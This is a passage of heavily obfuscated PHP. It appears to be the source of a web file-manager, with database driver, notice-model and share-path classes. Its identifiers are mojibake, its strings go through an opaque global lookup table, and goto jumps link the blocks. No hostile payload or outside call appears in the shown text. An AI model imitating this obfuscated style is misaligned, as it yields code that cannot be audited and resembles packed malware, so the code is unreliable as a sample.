public function replace($ æ¤ñ½Ë, $ßí¢Ë¡ = array()) { $„Ñš§ƒ =& $_SERVER[¶Ô„œ…¯]; foreach ($ æ¤ñ½Ë as $Şéê€Š => $®„¯¼šô) { $ƒ·”áÆ™ = $this->parseValue($®„¯¼šô); if (is_scalar($ƒ·”áÆ™)) { $Šôç­«à[] = $ƒ·”áÆ™; $…ˆı©Íâ[] = $this->parseKey($Şéê€Š); } } $™ÚŒî„œ = $„Ñš§ƒ[986] . $this->parseTable($ßí¢Ë¡[$„Ñš§ƒ[358]]) . $„Ñš§ƒ[987] . implode($„Ñš§ƒ[50], $…ˆı©Íâ) . $„Ñš§ƒ[988] . implode($„Ñš§ƒ[50], $Šôç­«à) . $„Ñš§ƒ[989]; return $this->execute($™ÚŒî„œ); } public function insertAll($•«ğ“˜•, $ä©ÀùÎ€ = array(), $ĞúüÚËí = false) { $¿Öå‘ú =& $_SERVER[¶Ô„œ…¯]; if (!is_array($•«ğ“˜•[0])) { return !1; } $›Ò§ˆª¹ = array_keys($•«ğ“˜•[0]); $‘ø˜ïÖø = array(); foreach ($•«ğ“˜• as $íğØÂÙş) { $éáªœ  = array(); foreach ($íğØÂÙş as $ÚÁõóæ => $Ã˜¸ûÙ†) { $Ã˜¸ûÙ† = $this->parseValue($Ã˜¸ûÙ†); if (is_scalar($Ã˜¸ûÙ†)) { $éáªœ [] = $Ã˜¸ûÙ†; } } $‘ø˜ïÖø[] = $¿Öå‘ú[339] . implode($¿Öå‘ú[50], $éáªœ ) . $¿Öå‘ú[989]; } array_walk($›Ò§ˆª¹, array($this, $¿Öå‘ú[990])); $±èİ±íö = ($ĞúüÚËí ? $¿Öå‘ú[991] : $¿Öå‘ú[992]) . $¿Öå‘ú[993] . $this->parseTable($ä©ÀùÎ€[$¿Öå‘ú[358]]) . $¿Öå‘ú[987] . implode($¿Öå‘ú[50], $›Ò§ˆª¹) . $¿Öå‘ú[994] . implode($¿Öå‘ú[50], $‘ø˜ïÖø); return $this->execute($±èİ±íö); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Š¿îˆ =& $_SERVER[¶Ô„œ…¯]; $this->error = mysql_errno() . $Š¿îˆ[4] . mysql_error($this->_linkID); if ($Š¿îˆ[12] != $this->queryStr) { $this->error .= LNG($Š¿îˆ[48]) . $this->queryStr; } think_trace($this->error, $Š¿îˆ[12], $Š¿îˆ[49]); return $this->error; } public function escapeString($–Èæî§Ê) { if ($this->_linkID) { return mysql_real_escape_string($–Èæî§Ê, $this->_linkID); } else { return mysql_escape_string($–Èæî§Ê); } } public function parseKey(&$Óì¸Š¬, $Ö½…€åÕ = true) { $Ï–Â·úì =& $_SERVER[¶Ô„œ…¯]; if ($Ö½…€åÕ) { $Óì¸Š¬ = $this->parseKeyCheck($Óì¸Š¬); } if ($Óì¸Š¬ != $Ï–Â·úì[222] && !preg_match($Ï–Â·úì[995], $Óì¸Š¬)) { $Óì¸Š¬ = $Ï–Â·úì[463] . trim($Óì¸Š¬, $Ï–Â·úì[463]) . $Ï–Â·úì[463]; } return $Óì¸Š¬; } } class DbMysqli extends Db { public function __construct($–’íß‰ = '') { $è”ò‚£¿ =& $_SERVER[¶Ô„œ…¯]; if (!extension_loaded($è”ò‚£¿[996])) { think_exception(think_lang($è”ò‚£¿[14]) . $è”ò‚£¿[997]); } if (!empty($–’íß‰)) { $this->config = $–’íß‰; if (empty($this->config[$è”ò‚£¿[17]])) { $this->config[$è”ò‚£¿[17]] = $è”ò‚£¿[12]; } } } public function connect($–Â¹Æš• = '', $ïÆÎ–“ˆ = 0) { $ÂÆÜ¬ =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->linkID[$ïÆÎ–“ˆ])) { if (empty($–Â¹Æš•)) { $–Â¹Æš• = $this->config; } $this->linkID[$ïÆÎ–“ˆ] = new mysqli($–Â¹Æš•[$ÂÆÜ¬[970]], $–Â¹Æš•[$ÂÆÜ¬[972]], $–Â¹Æš•[$ÂÆÜ¬[973]], $–Â¹Æš•[$ÂÆÜ¬[21]], $–Â¹Æš•[$ÂÆÜ¬[971]] ? intval($–Â¹Æš•[$ÂÆÜ¬[971]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‹îæÀÂÛ = $this->linkID[$ïÆÎ–“ˆ]->server_version; $this->linkID[$ïÆÎ–“ˆ]->query($ÂÆÜ¬[974] . think_config($ÂÆÜ¬[975]) . $ÂÆÜ¬[58]); if ($‹îæÀÂÛ > $ÂÆÜ¬[976]) { $this->linkID[$ïÆÎ–“ˆ]->query($ÂÆÜ¬[977]); } $this->connected = !0; if (1 != think_config($ÂÆÜ¬[22])) { unset($this->config); } } return $this->linkID[$ïÆÎ–“ˆ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($«Š‘²Úû) { $ÁñåÖ–÷ =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«Š‘²Úû; if ($this->queryID) { $this->free(); } think_action_status($ÁñåÖ–÷[23], 1); think_status($ÁñåÖ–÷[24]); $this->queryID = $this->_linkID->query($«Š‘²Úû); if ($this->_linkID->more_results()) { while (($ŸğÍ°€µ = $this->_linkID->next_result()) != NULL) { $ŸğÍ°€µ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($†ì¬ë¼ó) { $Î…¨‹Ñæ =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $†ì¬ë¼ó; if ($this->queryID) { $this->free(); } think_action_status($Î…¨‹Ñæ[25], 1); think_status($Î…¨‹Ñæ[24]); $¢Ûå½£Ü = $this->_linkID->query($†ì¬ë¼ó); $this->debug(); if (!1 === $¢Ûå½£Ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÖºõŠ¡¯ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÖºõŠ¡¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $û²¤Ş = $this->_linkID->rollback(); $this->transTimes = 0; if (!$û²¤Ş) { $this->error(); return !1; } } return !0; } private function getAll() { $Ğ²×íÖå = array(); if ($this->numRows > 0) { for ($ˆ¥àÄ¼ü = 0; $ˆ¥àÄ¼ü < $this->numRows; $ˆ¥àÄ¼ü++) { $Ğ²×íÖå[$ˆ¥àÄ¼ü] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ğ²×íÖå; } public function getFields($¿¿ç’Ôé) { $Øü‹ÏÖ =& $_SERVER[¶Ô„œ…¯]; $ãÙÎë£Ñ = $this->query($Øü‹ÏÖ[981] . $this->parseKey($¿¿ç’Ôé)); $ŒüŸ´–µ = array(); if ($ãÙÎë£Ñ) { foreach ($ãÙÎë£Ñ as $Ëì‚ıüê => $¤¨ –Ú) { $ŒüŸ´–µ[$¤¨ –Ú[$Øü‹ÏÖ[31]]] = array($Øü‹ÏÖ[32] => $¤¨ –Ú[$Øü‹ÏÖ[31]], $Øü‹ÏÖ[33] => $¤¨ –Ú[$Øü‹ÏÖ[34]], $Øü‹ÏÖ[35] => (bool) ($¤¨ –Ú[$Øü‹ÏÖ[36]] === $Øü‹ÏÖ[12]), $Øü‹ÏÖ[37] => $¤¨ –Ú[$Øü‹ÏÖ[38]], $Øü‹ÏÖ[39] => strtolower($¤¨ –Ú[$Øü‹ÏÖ[40]]) == $Øü‹ÏÖ[41], $Øü‹ÏÖ[42] => strtolower($¤¨ –Ú[$Øü‹ÏÖ[43]]) == $Øü‹ÏÖ[44]); } } return $ŒüŸ´–µ; } public function getTables($…ß¨Ç“› = '') { $›ú¥Ôë‹ =& $_SERVER[¶Ô„œ…¯]; $Îİ£ú…Ã = !empty($…ß¨Ç“›) ? $›ú¥Ôë‹[983] . $…ß¨Ç“› . $›ú¥Ôë‹[984] : $›ú¥Ôë‹[985]; $ûüÙ€ = $this->query($Îİ£ú…Ã); $¶ß¹½‚ = array(); if ($ûüÙ€) { foreach ($ûüÙ€ as $Ú”Äüëß => $•à‚º¯ı) { $¶ß¹½‚[$Ú”Äüëß] = current($•à‚º¯ı); } } return $¶ß¹½‚; } public function replace($´è†˜šÊ, $³êÂ½â® = array()) { $ú‘Ëâ˜ =& $_SERVER[¶Ô„œ…¯]; foreach ($´è†˜šÊ as $İÈÈ¼˜à => $˜ãù½†¼) { $§ßÙ¢Ä¹ = $this->parseValue($˜ãù½†¼); if (is_scalar($§ßÙ¢Ä¹)) { $¥ßº¦¥µ[] = $§ßÙ¢Ä¹; $ÇÖÈ‹½—[] = $this->parseKey($İÈÈ¼˜à); } } $÷ÕÄŸÚØ = $ú‘Ëâ˜[986] . $this->parseTable($³êÂ½â®[$ú‘Ëâ˜[358]]) . $ú‘Ëâ˜[987] . implode($ú‘Ëâ˜[50], $ÇÖÈ‹½—) . $ú‘Ëâ˜[988] . implode($ú‘Ëâ˜[50], $¥ßº¦¥µ) . $ú‘Ëâ˜[989]; return $this->execute($÷ÕÄŸÚØ); } public function insertAll($îÙçÒ, $ìä«¹–ƒ = array(), $Ü»¥äÙä = false) { $¸êÑÌë =& $_SERVER[¶Ô„œ…¯]; if (!is_array($îÙçÒ[0])) { return !1; } $£ì–±Ãş = array_keys($îÙçÒ[0]); $¼…ü·ø = array(); foreach ($îÙçÒ as $×®©ø) { $¶Àä¥ò = array(); foreach ($×®©ø as $Àêƒñ’„ => $Ş¡Ë³®¢) { $Ş¡Ë³®¢ = $this->parseValue($Ş¡Ë³®¢); if (is_scalar($Ş¡Ë³®¢)) { $¶Àä¥ò[] = $Ş¡Ë³®¢; } } $¼…ü·ø[] = $¸êÑÌë[339] . implode($¸êÑÌë[50], $¶Àä¥ò) . $¸êÑÌë[989]; } array_walk($£ì–±Ãş, array($this, $¸êÑÌë[990])); $³‹¶¢’Î = $Ü»¥äÙä ? $¸êÑÌë[991] : $¸êÑÌë[992]; $€³¶š© = $³‹¶¢’Î . $¸êÑÌë[993] . $this->parseTable($ìä«¹–ƒ[$¸êÑÌë[358]]) . $¸êÑÌë[987] . implode($¸êÑÌë[50], $£ì–±Ãş) . $¸êÑÌë[994] . implode($¸êÑÌë[50], $¼…ü·ø); return $this->execute($€³¶š©); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Õ‚âæ¾î =& $_SERVER[¶Ô„œ…¯]; $this->error = $this->_linkID->errno . $Õ‚âæ¾î[4] . $this->_linkID->error; if ($Õ‚âæ¾î[12] != $this->queryStr) { $this->error .= LNG($Õ‚âæ¾î[48]) . $this->queryStr; } think_trace($this->error, $Õ‚âæ¾î[12], $Õ‚âæ¾î[49]); return $this->error; } public function escapeString($¹ãÈß‰Ç) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¹ãÈß‰Ç); } else { return addslashes($¹ãÈß‰Ç); } } public function parseKey(&$ûöà«ûö, $¨³©•Æß = true) { $ı®÷” … =& $_SERVER[¶Ô„œ…¯]; if ($¨³©•Æß) { $ûöà«ûö = $this->parseKeyCheck($ûöà«ûö); } if ($ûöà«ûö != $ı®÷” …[222] && !preg_match($ı®÷” …[995], $ûöà«ûö)) { $ûöà«ûö = $ı®÷” …[463] . trim($ûöà«ûö, $ı®÷” …[463]) . $ı®÷” …[463]; } return $ûöà«ûö; } } goto E¡ÓÖÈƒÓİ; AùÆÄÏ›×: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\x6e\x6f\x74\x69\143\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x63\x6f\x6e\164\x65\x6e\164", "\x61\165\x74\x68", "\x6d\x6f\144\145", "\164\151\155\x65", "\x74\x79\x70\x65", "\154\145\x76\145\x6c", "\x65\156\141\142\x6c\x65", "\163\x6f\162\x74"); public function listData($¯¸†´ì³ = false, $™õĞ ªº = "\163\157\162\x74", $ÃøÚ—¨Ù = false) { return parent::listData($¯¸†´ì³, $™õĞ ªº, $ÃøÚ—¨Ù); } public function add($è‘ßÙ¶) { $»İğÅ†ü =& $_SERVER[¶Ô„œ…¯]; $Ø§Š„½¼ = time(); if ($è‘ßÙ¶[$»İğÅ†ü[16]] == $»İğÅ†ü[2451]) { $Ø§Š„½¼ = strtotime($è‘ßÙ¶[$»İğÅ†ü[206]]); } $è‘ßÙ¶[$»İğÅ†ü[206]] = $Ø§Š„½¼; return parent::insert($è‘ßÙ¶); } public function update($¾ªªÁè¹, $ÆØØ„øı) { $Å½¯›…Ã =& $_SERVER[¶Ô„œ…¯]; $“ ôÀõı = $this->listData($¾ªªÁè¹); if (!$“ ôÀõı) { return !1; } $ıçÚÀ¦€ = time(); if ($ÆØØ„øı[$Å½¯›…Ã[16]] == $Å½¯›…Ã[2451]) { $ıçÚÀ¦€ = strtotime($ÆØØ„øı[$Å½¯›…Ã[206]]); } $ÆØØ„øı[$Å½¯›…Ã[206]] = $ıçÚÀ¦€; return parent::update($¾ªªÁè¹, $ÆØØ„øı); } public function remove($›œ¯ÊÃ) { $ÌÜåÇÄÏ = $this->listData($›œ¯ÊÃ); if (!$ÌÜåÇÄÏ || $ÌÜåÇÄÏ[$_SERVER[¶Ô„œ…¯][191]]) { return !1; } return parent::remove($›œ¯ÊÃ); } public function sort($ç¯íñÖ, $·ÂÅ­¥ñ) { return parent::update($ç¯íñÖ, $·ÂÅ­¥ñ); } public function enable($©Ëâ„¯ı, $¶¾¾Î¼¦) { return parent::update($©Ëâ„¯ı, array($_SERVER[¶Ô„œ…¯][2452] => $¶¾¾Î¼¦)); } private function initUserOption() { $×Ÿì›Ø¶ =& $_SERVER[¶Ô„œ…¯]; $this->optionType = $×Ÿì›Ø¶[2453]; $this->modelType = $×Ÿì›Ø¶[2454]; $this->field = array($×Ÿì›Ø¶[2455], $×Ÿì›Ø¶[32], $×Ÿì›Ø¶[206], $×Ÿì›Ø¶[33], $×Ÿì›Ø¶[2456], $×Ÿì›Ø¶[828], $×Ÿì›Ø¶[228]); } public function userNoticeGet($•Ëºº¤ş = false) { $this->initUserOption(); return parent::listData($•Ëºº¤ş, $_SERVER[¶Ô„œ…¯][477], !0); } public function userNoticeAdd($ÚàÎ¸Û™) { $±óÎÜÁ¿ =& $_SERVER[¶Ô„œ…¯]; $this->initUserOption(); $âóëÉİ´ = $this->findByKey($±óÎÜÁ¿[2455], $ÚàÎ¸Û™[$±óÎÜÁ¿[477]]); if ($âóëÉİ´) { return !0; } $Åî¼¶ûí = array($±óÎÜÁ¿[2455] => $ÚàÎ¸Û™[$±óÎÜÁ¿[477]], $±óÎÜÁ¿[32] => $ÚàÎ¸Û™[$±óÎÜÁ¿[32]], $±óÎÜÁ¿[206] => $ÚàÎ¸Û™[$±óÎÜÁ¿[206]], $±óÎÜÁ¿[33] => isset($ÚàÎ¸Û™[$±óÎÜÁ¿[33]]) ? $ÚàÎ¸Û™[$±óÎÜÁ¿[33]] : 1, $±óÎÜÁ¿[2456] => isset($ÚàÎ¸Û™[$±óÎÜÁ¿[2456]]) ? $ÚàÎ¸Û™[$±óÎÜÁ¿[2456]] : 0, $±óÎÜÁ¿[828] => 0, $±óÎÜÁ¿[228] => 0); return parent::insert($Åî¼¶ûí); } public function userNoticeEdit($Ò Ç”çµ, $ÒâÅ€Ò™) { $this->initUserOption(); return parent::update($Ò Ç”çµ, $ÒâÅ€Ò™); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\145\x6d\137\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array("\155\x65\156\x75", "\162\x6f\154\145", "\162\157\x6c\x65\107\x72\157\x75\160", "\162\145\x67\x69\x73\164", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ç†‡Û) { return "\x53\171\163\164\145\x6d\x4f\160\x74\151\x6f\156\x5f{$ç†‡Û}"; } protected function optionDefault($ˆÒ²ó¤ = '') { $İ‹‹¥Ğ =& $_SERVER[¶Ô„œ…¯]; if ($ˆÒ²ó¤ == $İ‹‹¥Ğ[12]) { return $GLOBALS[$İ‹‹¥Ğ[6]][$İ‹‹¥Ğ[459]]; } } } class SystemRecordModel extends ModelBaseLight { } goto fÇ‚¨œÀ‹; e…“ÒÀ‰Íè: class PathDriverDbShareItem extends PathDriverDB { public function __construct($¬¤İ€Åù) { $this->pathParse = $¬¤İ€Åù; $this->model = Model($_SERVER[¶Ô„œ…¯][1428]); } public function getPathOuter($«û¿ŞŸ‹) { $¥€ÛÅÉ =& $_SERVER[¶Ô„œ…¯]; if (!$«û¿ŞŸ‹) { return $«û¿ŞŸ‹; } $ÌúÏ€ = $this->parse($«û¿ŞŸ‹); return trim(KodIO::makeShare($this->pathParse[$¥€ÛÅÉ[477]], $ÌúÏ€[$¥€ÛÅÉ[477]]), $¥€ÛÅÉ[8]); } protected function infoParse($îİË¶ÌË, $ğúòã¦Í = false, $ˆ‚ğıÜ = false) { $Š®®©áÊ =& $_SERVER[¶Ô„œ…¯]; $ÀùàúÖ = $this->pathParse[$Š®®©áÊ[477]]; $ÄĞˆˆ = trim($this->pathParse[$Š®®©áÊ[1257]], $Š®®©áÊ[8]); return Action($Š®®©áÊ[1435])->sharePathInfo($ÀùàúÖ, $ÄĞˆˆ, $ğúòã¦Í); } public function infoFull($şäÍÂè¡) { $íïŞßËë =& $_SERVER[¶Ô„œ…¯]; $Ø­±ùŞ‚ = explode($íïŞßËë[8], trim($şäÍÂè¡, $íïŞßËë[8])); if (count($Ø­±ùŞ‚) > 1) { $–Ë…ğŞİ = implode($íïŞßËë[8], array_splice($Ø­±ùŞ‚, 1)); $ãµÌ˜† = $this->model->pathInfoByPath($Ø­±ùŞ‚[0], $–Ë…ğŞİ); if (!$ãµÌ˜†) { return !1; } $this->pathParse[$íïŞßËë[1257]] = $ãµÌ˜†[$íïŞßËë[193]]; } return $this->infoParse($şäÍÂè¡); } public function listAll($øÌÅ«ş) { $¦›èù =& $_SERVER[¶Ô„œ…¯]; $˜Œâ´ñ = IO::info($this->pathParse[$¦›èù[87]]); if (!$˜Œâ´ñ) { return array(); } $ÌÈô¦…š = $this->model->listAll($øÌÅ«ş); $ÎÆÓõŠ÷ = Model($¦›èù[669])->getInfo($˜Œâ´ñ[$¦›èù[670]]); foreach ($ÌÈô¦…š as &$áæùˆ‹–) { check_abort(); $áæùˆ‹–[$¦›èù[90]] = Action($¦›èù[1435])->_shareItemeParse($áæùˆ‹–[$¦›èù[90]], $ÎÆÓõŠ÷); } unset($áæùˆ‹–); return $ÌÈô¦…š; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Ë‡§«å) { $this->pathParse = $Ë‡§«å; $this->model = Model($_SERVER[¶Ô„œ…¯][1428]); } protected function infoParse($æãê°Ş€, $»ÀôŠ‹¿ = false, $ı¥ïÖš = false) { $§üÅÛ€ =& $_SERVER[¶Ô„œ…¯]; return Action($§üÅÛ€[1263])->sharePathInfo($this->pathParse[$§üÅÛ€[87]], !0, $»ÀôŠ‹¿); } public function listPath($™ï®ÙŞ, $å‘ú«Ï = false) { $ğÍÇ¡ =& $_SERVER[¶Ô„œ…¯]; $»†ŒÚ›ï = parent::listPath($™ï®ÙŞ, $å‘ú«Ï); if (!$»†ŒÚ›ï) { return $»†ŒÚ›ï; } if (is_array($»†ŒÚ›ï[$ğÍÇ¡[1436]])) { $»†ŒÚ›ï[$ğÍÇ¡[1436]] = Action($ğÍÇ¡[1263])->shareItemInfo($»†ŒÚ›ï[$ğÍÇ¡[1436]]); } foreach ($»†ŒÚ›ï as $˜èÈ·ËÇ => $ÈÚ°ÚÓ) { if (!in_array($˜èÈ·ËÇ, array($ğÍÇ¡[86], $ğÍÇ¡[85]))) { continue; } foreach ($ÈÚ°ÚÓ as $Ìö ¬É… => $‡Ã‚€úŸ) { $»†ŒÚ›ï[$˜èÈ·ËÇ][$Ìö ¬É…] = Action($ğÍÇ¡[1263])->shareItemInfo($‡Ã‚€úŸ); } } return $»†ŒÚ›ï; } public function listAll($¡ñû¤) { $è©ÜˆÈØ =& $_SERVER[¶Ô„œ…¯]; $ùìòñË = IO::info($this->pathParse[$è©ÜˆÈØ[87]]); if (!$ùìòñË) { return array(); } $ÉŞ©¼’ã = $this->model->listAll($¡ñû¤); foreach ($ÉŞ©¼’ã as &$ü¶–”ô) { $ü¶–”ô[$è©ÜˆÈØ[90]] = Action($è©ÜˆÈØ[1263])->shareItemInfo($ü¶–”ô[$è©ÜˆÈØ[90]]); } unset($ü¶–”ô); return $ÉŞ©¼’ã; } } $_file = $_SERVER[$_SERVER[¶Ô„œ…¯][926]]; goto fîƒç½ö§¢; EÄò°ğˆÏš: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($œ’êŞşÆ) { $ïíÖ™†Á =& $_SERVER[¶Ô„œ…¯]; $¸°Šêİâ = Model($ïíÖ™†Á[579])->where(array($ïíÖ™†Á[1771] => $œ’êŞşÆ))->find(); $ ÄÑï¯ = $this->_mkdirRoot(SourceModel::TYPE_USER, $œ’êŞşÆ, $¸°Šêİâ[$ïíÖ™†Á[32]]); $this->userDesktopAdd($ ÄÑï¯); return $ ÄÑï¯; } public function userDesktopAdd($éµş§¹Ÿ) { $å±æã¶Í =& $_SERVER[¶Ô„œ…¯]; $¼„±Æ‚† = LNG($å±æã¶Í[2261]); $Ğ’ü¬¸ = $this->mkdir($éµş§¹Ÿ, $¼„±Æ‚†); $this->metaSet($Ğ’ü¬¸, $å±æã¶Í[2262], $å±æã¶Í[91]); $this->metaSet($éµş§¹Ÿ, $å±æã¶Í[2263], $Ğ’ü¬¸); } public function userPathSafeAdd($±¨ƒ‚ç×) { $ù£û¨Ó =& $_SERVER[¶Ô„œ…¯]; $ñ‹„Ô¨ = Model($ù£û¨Ó[579])->getInfoFull($±¨ƒ‚ç×); if (!$ñ‹„Ô¨) { return !1; } if (_get($ñ‹„Ô¨, $ù£û¨Ó[600])) { return $ñ‹„Ô¨[$ù£û¨Ó[541]][$ù£û¨Ó[2264]]; } $ûø®Ö½ = $this->_mkdirRoot(SourceModel::TYPE_USER, $±¨ƒ‚ç×, $ù£û¨Ó[2265], $ù£û¨Ó[2266]); Model($ù£û¨Ó[579])->metaSet($±¨ƒ‚ç×, $ù£û¨Ó[2264], $ûø®Ö½); $this->metaSet($ûø®Ö½, $ù£û¨Ó[2267], $±¨ƒ‚ç×); return $ûø®Ö½; } public function userPathAppAdd($õ†–×Û·, $á­åÏç = '', $·‹µÆÇİ = '') { $§ÀØé¬Ù =& $_SERVER[¶Ô„œ…¯]; $Òãñ‰ = Model($§ÀØé¬Ù[579])->getInfoFull($õ†–×Û·); if (!$Òãñ‰) { return !1; } $§ñ˜ŠãÍ = $Òãñ‰[$§ÀØé¬Ù[541]] ? $Òãñ‰[$§ÀØé¬Ù[541]] : array(); $¢¼»³¢¤ = $§ñ˜ŠãÍ[$§ÀØé¬Ù[2268]]; if (!$¢¼»³¢¤) { $¢¼»³¢¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $õ†–×Û·, $§ÀØé¬Ù[2269], $§ÀØé¬Ù[2270]); Model($§ÀØé¬Ù[579])->metaSet($õ†–×Û·, $§ÀØé¬Ù[2268], $¢¼»³¢¤ . $§ÀØé¬Ù[12]); $this->metaSet($¢¼»³¢¤, $§ÀØé¬Ù[2268], $õ†–×Û·); } if (!$á­åÏç) { return $¢¼»³¢¤; } $é¹·Ê©í = $§ñ˜ŠãÍ[$§ÀØé¬Ù[2271] . $á­åÏç]; if (!$é¹·Ê©í) { $é¹·Ê©í = $this->mkdir($¢¼»³¢¤, $á­åÏç); Model($§ÀØé¬Ù[579])->metaSet($õ†–×Û·, $§ÀØé¬Ù[2271] . $á­åÏç, $é¹·Ê©í); $this->metaSet($é¹·Ê©í, $§ÀØé¬Ù[2271] . $á­åÏç, $õ†–×Û·); } if (!$·‹µÆÇİ) { return $é¹·Ê©í; } $‡®‡ƒÒ½ = $this->mkdir($é¹·Ê©í, $·‹µÆÇİ); return $‡®‡ƒÒ½; } public function groupRootAdd($Ü•’ê¡) { $—ºá’›´ =& $_SERVER[¶Ô„œ…¯]; $Ú«¿÷í’ = Model($—ºá’›´[587])->where(array($—ºá’›´[2072] => $Ü•’ê¡))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ü•’ê¡, $Ú«¿÷í’[$—ºá’›´[32]]); } public function systemRootPathAdd($ÅøîõãÃ) { if ($ÅøîõãÃ != $_SERVER[¶Ô„œ…¯][610]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÅøîõãÃ); } public function userRootRemove($éÛõ‹ÒÈ) { $—Ö¾öÁ· = $this->targetSourceRoot(SourceModel::TYPE_USER, $éÛõ‹ÒÈ, !0); foreach ($—Ö¾öÁ· as $Üà©³èò) { if (!$Üà©³èò) { continue; } $this->remove($Üà©³èò[$_SERVER[¶Ô„œ…¯][193]], !1); } } public function groupRootRemove($õ³ü“Ëî) { $°×¥éıı = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $õ³ü“Ëî); if (!$°×¥éıı) { return; } $this->remove($°×¥éıı[$_SERVER[¶Ô„œ…¯][193]], !1); } private function _mkdirRoot($Áìúİ¾—, $µÜ„²Û, $ÁãŸŠØ’, $•‡ÂÍÂ½ = '') { $Ïë¬œı² =& $_SERVER[¶Ô„œ…¯]; $¤ûòè• = defined($Ïë¬œı²[2207]) ? USER_ID : 0; $…³èé¿Ë = array($Ïë¬œı²[479] => 0, $Ïë¬œı²[653] => $Áìúİ¾—, $Ïë¬œı²[654] => $µÜ„²Û, $Ïë¬œı²[651] => 1, $Ïë¬œı²[655] => $¤ûòè•, $Ïë¬œı²[656] => $¤ûòè•, $Ïë¬œı²[652] => $•‡ÂÍÂ½, $Ïë¬œı²[657] => $Ïë¬œı²[595], $Ïë¬œı²[506] => 0, $Ïë¬œı²[622] => 0, $Ïë¬œı²[544] => 0, $Ïë¬œı²[658] => $Ïë¬œı²[12]); if ($Ä»™š– = $this->where($…³èé¿Ë)->find()) { return $Ä»™š–[$Ïë¬œı²[193]]; } $˜¶À¯¤“ = "\x4d\157\x64\x65\154\123\x6f\x75\x72\143\x65\x2e\x6d\153\x64\x69\x72\122\x6f\157\x74\56{$Áìúİ¾—}\56{$µÜ„²Û}\56" . $ÁãŸŠØ’; CacheLock::lock($˜¶À¯¤“); $…³èé¿Ë[$Ïë¬œı²[32]] = $ÁãŸŠØ’; $‚Ô££Å¿ = $this->add($…³èé¿Ë); $ıè¿ğõş = array($Ïë¬œı²[659] => short_id($‚Ô££Å¿)); $this->where(array($Ïë¬œı²[493] => $‚Ô££Å¿))->save($ıè¿ğõş); CacheLock::unlock($˜¶À¯¤“); return $‚Ô££Å¿; } private function targetSourceRoot($ÖÏĞ¼Ñ’, $¡ôÈöÕ‘, $“¥ª²†¼ = false) { $©ƒÌõ¾ü =& $_SERVER[¶Ô„œ…¯]; $ğÒÕ‚… = array($©ƒÌõ¾ü[479] => 0, $©ƒÌõ¾ü[653] => $ÖÏĞ¼Ñ’, $©ƒÌõ¾ü[654] => $¡ôÈöÕ‘); if ($“¥ª²†¼) { $¼Ó¦ŞœÊ = $this->where($ğÒÕ‚…)->select(); return $¼Ó¦ŞœÊ ? $¼Ó¦ŞœÊ : array(); } $ïº…Ôá¢ = $this->where($ğÒÕ‚…)->find(); return $ïº…Ôá¢ ? $ïº…Ôá¢ : array(); } public function sourceRootGroup($ÀÛäœÚ ) { $À¿÷Ş’í =& $_SERVER[¶Ô„œ…¯]; if (is_string($ÀÛäœÚ )) { $ÀÛäœÚ  = array($ÀÛäœÚ ); } $–õî¢Å¦ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÀÛäœÚ , $À¿÷Ş’í[222]); $ÑÜÏ¥Ø† = array($À¿÷Ş’í[447] => $–õî¢Å¦, $À¿÷Ş’í[444] => array($À¿÷Ş’í[836] => count($ÀÛäœÚ ))); $this->_listDataApply($ÑÜÏ¥Ø†[$À¿÷Ş’í[447]]); $this->_listMake($ÑÜÏ¥Ø†); return array_to_keyvalue($ÑÜÏ¥Ø†[$À¿÷Ş’í[85]], $À¿÷Ş’í[571]); } public function mkfile($ÃÀå•„ï, $ŸÕŠ, $Â²¤¤ëÈ = '', $˜ÖÕöŒû = REPEAT_RENAME) { $ö¼Óû¾¿ =& $_SERVER[¶Ô„œ…¯]; $Ÿ˜×¨ ü = Model($ö¼Óû¾¿[679])->addFileByContent($Â²¤¤ëÈ, $ŸÕŠ); return $this->_createFileCall($ÃÀå•„ï, $ŸÕŠ, $Ÿ˜×¨ ü, $˜ÖÕöŒû, $ö¼Óû¾¿[1439]); } public function addFile($ê¨²É–, $ã§¥ÀŸ—, $ÚÇ‚ŞñÄ, $ôÈİ×˜ª = false, $Îğ¨Úåâ = REPEAT_RENAME) { $©ôØç¦° = Model($_SERVER[¶Ô„œ…¯][679])->addFile($ã§¥ÀŸ—, $ÚÇ‚ŞñÄ, $ôÈİ×˜ª); return $this->_createFileCall($ê¨²É–, $ÚÇ‚ŞñÄ, $©ôØç¦°, $Îğ¨Úåâ); } public function addFileByFileID($óŒ…ã‹Ú, $ºò‘çÕ”, $‚øİû“ï, $ßßÆüÓ× = REPEAT_RENAME) { $¡ëú¿Ú± =& $_SERVER[¶Ô„œ…¯]; 